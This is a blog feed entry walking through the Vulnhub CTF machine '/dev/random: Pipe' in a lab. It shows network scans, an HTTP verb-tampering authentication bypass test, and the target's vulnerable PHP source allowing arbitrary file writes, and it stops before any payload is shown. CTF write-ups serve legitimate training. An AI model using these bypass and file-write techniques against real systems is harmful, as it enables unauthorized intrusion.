<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: tomcat | F4l13n5n0w]]></title>
  <link href="http://f4l13n5n0w.github.io/blog/categories/tomcat/atom.xml" rel="self"/>
  <link href="http://f4l13n5n0w.github.io/"/>
  <updated>2015-11-23T08:01:25-05:00</updated>
  <id>http://f4l13n5n0w.github.io/</id>
  <author>
    <name><![CDATA[F4l13n5n0w]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[[Vulnhub] Pipe]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/11/23/vulnhub-pipe/"/>
    <updated>2015-11-23T05:43:52-05:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/11/23/vulnhub-pipe</id>
    <content type="html"><![CDATA[<p><strong>/dev/random: Pipe</strong> is another one CTF challange in the series <strong>/dev/random</strong>, which is created by <a href="https://www.vulnhub.com/author/sagi-,36/">Sagi-</a>.</p>

<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/devrandom-pipe,124/">here</a>.</p>

<!-- more -->


<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali2 Linux (<em>10.1.1.130/24</em>)</p>

<p>Target: /dev/random: Sleepy (<em>10.1.1.143/24</em>)</p>

<h2>Vulnerability &amp; Exploit</h2>

<ul>
<li>Basic Authentication bypass: <a href="https://bz.apache.org/bugzilla/show_bug.cgi?id=28778" title="HTTP method tamper in 2004">HTTP method tamper</a></li>
<li>Backup file <code>Log.php.BAK</code> exists in the server and source code disclosure</li>
<li>Analyze and found the source code is able to upload arbitrary file, which can be used to upload web shell</li>
<li>After got a shell, enumerating and find the vulnerablity <code>tar with wildcard *</code> can be exploited to ROOT</li>
</ul>


<h2>Method</h2>

<ul>
<li>Scanned the network to discover the target server [<font color="FF8000">arp-scan</font>]</li>
<li>Port scanned the target to discover running services and open ports [<font color="FF8000">masscan</font> &amp;&amp; <font color="FF8000">nmap</font>]</li>
<li>Using <code>HTTP method tamper</code> to bypass the Basic Authentication on resource page <code>index.php</code> [<font color="FF8000">nmap with script</font>]</li>
<li>Brute force scan to find hidden path [<font color="FF8000">dirbuster</font>]</li>
<li>Found and analysed source code in finding files <code>php.js</code> and <code>Log.php.BAK</code>, as a result, find a file upload function.</li>
<li>Write web shell to target server and use <code>nc</code> to get a reverse shell [<font color="FF8000">nc</font>]</li>
<li>Enumeration and exploit <code>tar with wildcard</code> vulnerability to get ROOT</li>
</ul>


<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://linux.die.net/man/1/arp-scan">arp-scan</a></li>
<li><a href="https://github.com/robertdavidgraham/masscan">masscan</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
<li><a href="https://cirt.net/Nikto2">nikto</a></li>
<li><a href="https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project">dirbuster</a></li>
<li><a href="https://portswigger.net/burp/">burp suite</a></li>
<li><a href="http://linux.die.net/man/1/nc">nc</a></li>
</ul>


<h2>Walkthrough</h2>

<p>Using <code>arp-scan</code> as routine to detect the target&rsquo;s IP address (10.1.1.142 in this case).</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# arp-scan -l
</span><span class='line'>Interface: eth0, datalink <span class="nb">type</span>: EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>
</span><span class='line'>Starting arp-scan 1.9 with <span class="m">256</span> hosts <span class="o">(</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.nta-monitor.com/tools/arp-scan/&quot;</span>&gt;http://www.nta-monitor.com/tools/arp-scan/&lt;/a&gt;<span class="o">)</span>
</span><span class='line'>10.1.1.1    00:50:56:c0:00:08   VMware, Inc.
</span><span class='line'>10.1.1.2    00:50:56:fd:d1:6b   VMware, Inc.
</span><span class='line'>10.1.1.143  00:0c:29:64:39:5e   VMware, Inc.
</span><span class='line'>10.1.1.254  00:50:56:f5:74:35   VMware, Inc.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;4 packets received by filter, <span class="m">0</span> packets dropped by kernel
</span><span class='line'>Ending arp-scan 1.9: <span class="m">256</span> hosts scanned in 2.657 seconds <span class="o">(</span>96.35 hosts/sec<span class="o">)</span>. <span class="m">4</span> responded
</span></code></pre></td></tr></table></div></figure></p>

<p>10.1.1.143 is our Target!</p>

<p>Then run <code>masscan</code> to detect opening ports on the target (masscan is much faster than nmap when doing a full ports scan, so here I use it to make a full scan and then use nmap to do a deep scan on target ports).</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# masscan -p1-65535 10.1.1.143/32 <span class="p">&amp;</span>ndash<span class="p">;</span><span class="nv">rate</span><span class="o">=</span>10000&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Starting masscan 1.0.3 <span class="o">(</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://bit.ly/14GZzcT&quot;</span>&gt;http://bit.ly/14GZzcT&lt;/a&gt;<span class="o">)</span> at 2015-11-21 00:47:26 GMT
</span><span class='line'> <span class="p">&amp;</span>ndash<span class="p">;</span> forced options: -sS -Pn -n <span class="p">&amp;</span>ndash<span class="p">;</span>randomize-hosts -v <span class="p">&amp;</span>ndash<span class="p">;</span>send-eth
</span><span class='line'>Initiating SYN Stealth Scan
</span><span class='line'>Scanning <span class="m">1</span> hosts <span class="o">[</span><span class="m">65535</span> ports/host<span class="o">]</span>
</span><span class='line'>Discovered open port 40117/tcp on 10.1.1.143                                 &lt;br/&gt;
</span><span class='line'>Discovered open port 111/tcp on 10.1.1.143                                   &lt;br/&gt;
</span><span class='line'>Discovered open port 80/tcp on 10.1.1.143                                    &lt;br/&gt;
</span><span class='line'>Discovered open port 22/tcp on 10.1.1.143
</span></code></pre></td></tr></table></div></figure></p>

<p>There are 4 ports (22, 80, 111, 40117) detected by <code>masscan</code>, then I run <code>nmap</code> to do a deeper service scan.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;Nmap 6.49BETA5 scan initiated Tue Nov <span class="m">17</span> 05:50:42 <span class="m">2015</span> as: nmap -sV -v -O -A -T4 -p80,22,111,44161 -oN 10.1.1.143_nmap.txt 10.1.1.143&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Nmap scan report <span class="k">for</span> 10.1.1.143
</span><span class='line'>Host is up <span class="o">(</span>0.00035s latency<span class="o">)</span>.
</span><span class='line'>PORT      STATE SERVICE VERSION
</span><span class='line'>22/tcp    open  ssh     OpenSSH 6.7p1 Debian <span class="m">5</span> <span class="o">(</span>protocol 2.0<span class="o">)</span>
</span><span class='line'><span class="p">|</span> ssh-hostkey:
</span><span class='line'><span class="p">|</span>   <span class="m">1024</span> 16:48:50:89:e7:c9:1f:90:ff:15:d8:3e:ce:ea:53:8f <span class="o">(</span>DSA<span class="o">)</span>
</span><span class='line'><span class="p">|</span>   <span class="m">2048</span> ca:f9:85:be:d7:36:47:51:4f:e6:27:84:72:eb:e8:18 <span class="o">(</span>RSA<span class="o">)</span>
</span><span class='line'><span class="p">|</span>&lt;em&gt;  <span class="m">256</span> d8:47:a0:87:84:b2:eb:f5:be:fc:1c:f1:c9:7f:e3:52 <span class="o">(</span>ECDSA<span class="o">)</span>
</span><span class='line'>80/tcp    open  http    Apache httpd
</span><span class='line'><span class="p">|</span> http-auth:
</span><span class='line'><span class="p">|</span> HTTP/1.1 <span class="m">401</span> Unauthorized
</span><span class='line'><span class="p">|</span>&lt;/em&gt;  Basic <span class="nv">realm</span><span class="o">=</span>index.php
</span><span class='line'><span class="p">|</span>&lt;em&gt;http-methods: No Allow or Public header in OPTIONS response <span class="o">(</span>status code 401<span class="o">)</span>
</span><span class='line'><span class="p">|</span>&lt;/em&gt;http-server-header: Apache
</span><span class='line'><span class="p">|</span>&lt;em&gt;http-title: <span class="m">401</span> Unauthorized
</span><span class='line'>111/tcp   open  rpcbind 2-4 <span class="o">(</span>RPC <span class="c">#100000)</span>
</span><span class='line'><span class="p">|</span> rpcinfo:
</span><span class='line'><span class="p">|</span>   program version   port/proto  service
</span><span class='line'><span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/tcp  rpcbind
</span><span class='line'><span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/udp  rpcbind
</span><span class='line'><span class="p">|</span>   <span class="m">100024</span>  <span class="m">1</span>          37301/udp  status
</span><span class='line'><span class="p">|</span>&lt;/em&gt;  <span class="m">100024</span>  <span class="m">1</span>          44161/tcp  status
</span><span class='line'>44161/tcp open  status  <span class="m">1</span> <span class="o">(</span>RPC <span class="c">#100024)</span>
</span><span class='line'>MAC Address: 00:0C:29:64:39:5E <span class="o">(</span>VMware<span class="o">)</span>
</span><span class='line'>Warning: OSScan results may be unreliable because we could not find at least <span class="m">1</span> open and <span class="m">1</span> closed port
</span><span class='line'>Device <span class="nb">type</span>: general purpose
</span><span class='line'>Running: Linux 3.X
</span><span class='line'>OS CPE: cpe:/o:linux:linux_kernel:3
</span><span class='line'>OS details: Linux 3.2 - 3.19
</span><span class='line'>Uptime guess: 0.001 days <span class="o">(</span>since Tue Nov <span class="m">17</span> 05:49:56 2015<span class="o">)</span>
</span><span class='line'>Network Distance: <span class="m">1</span> hop
</span><span class='line'><span class="p">&amp;</span>hellip<span class="p">;</span> turncate <span class="p">&amp;</span>hellip<span class="p">;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Due to port 80 is open (providing web service on the target server), run <code>Nikto</code> to do a web vuln scan:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/the_pipe# nikto -host 10.1.1.143&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h2&gt;- Nikto v2.1.6&lt;/h2&gt;
</span><span class='line'>
</span><span class='line'>&lt;ul&gt;
</span><span class='line'>&lt;li&gt;Target IP:          10.1.1.143&lt;/li&gt;
</span><span class='line'>&lt;li&gt;Target Hostname:    10.1.1.143&lt;/li&gt;
</span><span class='line'>&lt;li&gt;Target Port:        80
</span><span class='line'>
</span><span class='line'>&lt;ul&gt;
</span><span class='line'>&lt;li&gt;Start Time:         2015-11-20 19:53:42 <span class="o">(</span>GMT-5<span class="o">)</span>&lt;/li&gt;
</span><span class='line'>&lt;/ul&gt;
</span><span class='line'>&lt;/li&gt;
</span><span class='line'>&lt;/ul&gt;
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;ul&gt;
</span><span class='line'>&lt;li&gt;Server: Apache&lt;/li&gt;
</span><span class='line'>&lt;li&gt;The anti-clickjacking X-Frame-Options header is not present.&lt;/li&gt;
</span><span class='line'>&lt;li&gt;The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS&lt;/li&gt;
</span><span class='line'>&lt;li&gt;The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME <span class="nb">type</span>&lt;/li&gt;
</span><span class='line'>&lt;li&gt;/ - Requires Authentication <span class="k">for</span> realm <span class="p">&amp;</span>lsquo<span class="p">;</span>index.php<span class="p">&amp;</span>rsquo<span class="p">;</span>&lt;/li&gt;
</span><span class='line'>&lt;li&gt;No CGI Directories found <span class="o">(</span>use <span class="p">&amp;</span>lsquo<span class="p">;</span>-C all<span class="p">&amp;</span>rsquo<span class="p">;</span> to force check all possible <span class="nb">dirs</span><span class="o">)</span>&lt;/li&gt;
</span><span class='line'>&lt;li&gt;/ - Requires Authentication <span class="k">for</span> realm <span class="p">&amp;</span>lsquo<span class="p">;</span>index.php<span class="p">&amp;</span>rsquo<span class="p">;</span>&lt;/li&gt;
</span><span class='line'>&lt;li&gt;IP address found in the <span class="p">&amp;</span>lsquo<span class="p">;</span>location<span class="p">&amp;</span>rsquo<span class="p">;</span> header. The IP is <span class="p">&amp;</span>ldquo<span class="p">;</span>127.0.1.1<span class="p">&amp;</span>rdquo<span class="p">;</span>.&lt;/li&gt;
</span><span class='line'>&lt;li&gt;OSVDB-630: IIS may reveal its internal or real IP in the Location header via a request to the /images directory. The value is <span class="p">&amp;</span>ldquo<span class="p">;</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://127.0.1.1/images/&quot;</span>&gt;http://127.0.1.1/images/&lt;/a&gt;<span class="p">&amp;</span>rdquo<span class="p">;</span>.
</span><span class='line'><span class="p">&amp;</span>hellip<span class="p">;</span> turncat <span class="p">&amp;</span>hellip<span class="p">;</span>&lt;/li&gt;
</span><span class='line'>&lt;li&gt;/ - Requires Authentication <span class="k">for</span> realm <span class="p">&amp;</span>lsquo<span class="p">;</span>index.php<span class="p">&amp;</span>rsquo<span class="p">;</span>
</span><span class='line'><span class="p">&amp;</span>hellip<span class="p">;</span> turncat <span class="p">&amp;</span>hellip<span class="p">;</span>&lt;/li&gt;
</span><span class='line'>&lt;li&gt;OSVDB-3268: /images/: Directory indexing found.&lt;/li&gt;
</span><span class='line'>&lt;li&gt;/ - Requires Authentication <span class="k">for</span> realm <span class="p">&amp;</span>lsquo<span class="p">;</span>index.php<span class="p">&amp;</span>rsquo<span class="p">;</span>&lt;/li&gt;
</span><span class='line'>&lt;li&gt;OSVDB-3268: /images/?pattern<span class="o">=</span>/etc/*<span class="p">&amp;</span>amp<span class="p">;</span><span class="nv">sort</span><span class="o">=</span>name: Directory indexing found.&lt;/li&gt;
</span><span class='line'>&lt;li&gt;/ - Requires Authentication <span class="k">for</span> realm <span class="p">&amp;</span>lsquo<span class="p">;</span>index.php<span class="p">&amp;</span>rsquo<span class="p">;</span>&lt;/li&gt;
</span><span class='line'>&lt;li&gt;7667 requests: <span class="m">0</span> error<span class="o">(</span>s<span class="o">)</span> and <span class="m">7</span> item<span class="o">(</span>s<span class="o">)</span> reported on remote host
</span><span class='line'>
</span><span class='line'>&lt;ul&gt;
</span><span class='line'>&lt;li&gt;End Time:           2015-11-20 19:54:03 <span class="o">(</span>GMT-5<span class="o">)</span> <span class="o">(</span><span class="m">21</span> seconds<span class="o">)</span>&lt;/li&gt;
</span><span class='line'>&lt;/ul&gt;
</span><span class='line'>&lt;/li&gt;
</span><span class='line'>&lt;/ul&gt;
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;ul&gt;
</span><span class='line'>&lt;li&gt;1 host<span class="o">(</span>s<span class="o">)</span> tested
</span></code></pre></td></tr></table></div></figure></li>
</ul>


<p>Nikto scan could not find any suspicious footprint, then I try Dirbuster to brute force hidden folders / files:</p>

<p>Two source code files discovered in folder &lsquo;scriptz&rsquo;:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/scriptz/log.php.BAK
</span><span class='line'>/scriptz/php.js</span></code></pre></td></tr></table></div></figure></p>

<p>Analyze the first file &ldquo;log.php.BAK&rdquo;, this is a backup of &ldquo;log.php&rdquo; obviously, so if I can find / run &ldquo;log.php&rdquo; I would be able to upload shell to the target server:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">\</span><span class="o">?</span><span class="nx">php</span>
</span><span class='line'><span class="k">class</span> <span class="nc">Log</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="k">public</span> <span class="nv">$filename</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
</span><span class='line'>    <span class="k">public</span> <span class="nv">$data</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">pre</span><span class="o">&gt;&lt;</span><span class="nx">code</span><span class="o">&gt;</span><span class="k">public</span> <span class="k">function</span> <span class="nf">__construct</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">filename</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span><span class='line'><span class="nv">$this</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">data</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">public</span> <span class="k">function</span> <span class="nf">PrintLog</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="nv">$pre</span> <span class="o">=</span> <span class="s2">&quot;[LOG]&quot;</span><span class="p">;</span>
</span><span class='line'><span class="nv">$now</span> <span class="o">=</span> <span class="nb">date</span><span class="p">(</span><span class="s1">&#39;Y-m-d H:i:s&#39;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="nv">$str</span> <span class="o">=</span> <span class="s1">&#39;$pre - $now - $this-&amp;gt;data&#39;</span><span class="p">;</span>
</span><span class='line'>    <span class="k">eval</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\$</span><span class="s2">str = </span><span class="se">\&quot;</span><span class="si">$str\</span><span class="s2">&quot;</span><span class="p">;</span><span class="s2">&quot;);</span>
</span><span class='line'><span class="s2">    echo </span><span class="si">$str</span><span class="s2">;</span>
</span><span class='line'><span class="s2">}</span>
</span><span class='line'>
</span><span class='line'><span class="s2">public function __destruct()</span>
</span><span class='line'><span class="s2">{</span>
</span><span class='line'><span class="s2">file_put_contents(</span><span class="si">$this</span><span class="s2">-&amp;gt;filename, </span><span class="si">$this</span><span class="s2">-&amp;gt;data, FILE_APPEND);           // &amp;lt;== Here we can write any code into any file</span>
</span><span class='line'><span class="s2">}</span>
</span><span class='line'><span class="s2">&lt;/code&gt;&lt;/pre&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="s2">&lt;p&gt;}</span>
</span><span class='line'><span class="s2">\?&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Both <code>nmap</code> and <code>nikto</code> results show us that <code>index.php</code> exists under the root path and it requires Basic authentication to access this page.</p>

<p>There is one method can be used to test if the authentication can be bypassed called <code>http method tamper</code> (first appears in 2004, <a href="https://bz.apache.org/bugzilla/show_bug.cgi?id=28778">https://bz.apache.org/bugzilla/show_bug.cgi?id=28778</a>) and Nmap provides a <a href="https://nmap.org/nsedoc/scripts/http-method-tamper.html" title="NMAP script: HTTP method tamper">script</a> to auto-test it.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/the_pipe# nmap -p <span class="m">80</span> <span class="p">&amp;</span>ndash<span class="p">;</span>script http-method-tamper <span class="p">&amp;</span>ndash<span class="p">;</span>script-args <span class="p">&amp;</span>lsquo<span class="p">;</span>http-method-tamper.paths<span class="o">={</span>/index.php<span class="o">}</span><span class="p">&amp;</span>rsquo<span class="p">;</span> 10.1.1.143&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Starting Nmap 6.49BETA5 <span class="o">(</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://nmap.org&quot;</span>&gt;https://nmap.org&lt;/a&gt; <span class="o">)</span> at 2015-11-20 21:57 EST
</span><span class='line'>Nmap scan report <span class="k">for</span> 10.1.1.143
</span><span class='line'>Host is up <span class="o">(</span>0.00024s latency<span class="o">)</span>.
</span><span class='line'>PORT   STATE SERVICE
</span><span class='line'>80/tcp open  http
</span><span class='line'><span class="p">|</span> http-method-tamper:
</span><span class='line'><span class="p">|</span>   VULNERABLE:
</span><span class='line'><span class="p">|</span>   Authentication bypass by HTTP verb tampering
</span><span class='line'><span class="p">|</span>     State: VULNERABLE <span class="o">(</span>Exploitable<span class="o">)</span>
</span><span class='line'><span class="p">|</span>       This web server contains password protected resources vulnerable to authentication bypass
</span><span class='line'><span class="p">|</span>       vulnerabilities via HTTP verb tampering. This is often found in web servers that only limit access to the
</span><span class='line'><span class="p">|</span>        common HTTP methods and in misconfigured .htaccess files.
</span><span class='line'><span class="p">|</span>            &lt;br/&gt;
</span><span class='line'><span class="p">|</span>     Extra information:
</span><span class='line'><span class="p">|</span>     &lt;br/&gt;
</span><span class='line'><span class="p">|</span>   URIs suspected to be vulnerable to HTTP verb tampering:
</span><span class='line'><span class="p">|</span>     /index.php <span class="o">[</span>POST<span class="o">]</span>
</span><span class='line'><span class="p">|</span> &lt;br/&gt;
</span><span class='line'><span class="p">|</span>     References:
</span><span class='line'><span class="p">|</span>       &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://www.owasp.org/index.php/Testing_for_HTTP_Methods_and_XST_%28OWASP-CM-008%29&quot;</span>&gt;https://www.owasp.org/index.php/Testing_for_HTTP_Methods_and_XST_%28OWASP-CM-008%29&lt;/a&gt;
</span><span class='line'><span class="p">|</span>       &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://capec.mitre.org/data/definitions/274.html&quot;</span>&gt;http://capec.mitre.org/data/definitions/274.html&lt;/a&gt;
</span><span class='line'><span class="p">|</span>       &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.imperva.com/resources/glossary/http_verb_tampering.html&quot;</span>&gt;http://www.imperva.com/resources/glossary/http_verb_tampering.html&lt;/a&gt;
</span><span class='line'><span class="p">|</span>_      &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.mkit.com.ar/labs/htexploit/&quot;</span>&gt;http://www.mkit.com.ar/labs/htexploit/&lt;/a&gt;
</span><span class='line'>MAC Address: 00:0C:29:64:39:5E <span class="o">(</span>VMware<span class="o">)</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 0.91 seconds
</span></code></pre></td></tr></table></div></figure></p>

<p>It is vulnerable to POST method, so now I start up burp proxy to bypass the authentication and got the protected page:</p>

<p><img class="left" src="/downloads/pipe/1.png"></p>

<p>Bingo! Next we will check the source code:</p>

<p><figure class='code'><figcaption><span>index.php.txt  (index.php.txt)</span> <a href='/downloads/code/index.php.txt'>download</a></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;</span><span class="nx">html</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">head</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">meta</span> <span class="nx">http</span><span class="o">-</span><span class="nx">equiv</span><span class="o">=</span><span class="s2">&quot;Content-Type&quot;</span> <span class="nx">content</span><span class="o">=</span><span class="s2">&quot;text/html; charset=UTF-8&quot;</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">script</span> <span class="nx">src</span><span class="o">=</span><span class="s2">&quot;scriptz/php.js&quot;</span><span class="o">&gt;&lt;/</span><span class="nx">script</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
</span><span class='line'><span class="k">function</span> <span class="nf">submit_form</span><span class="p">()</span> <span class="p">{</span>
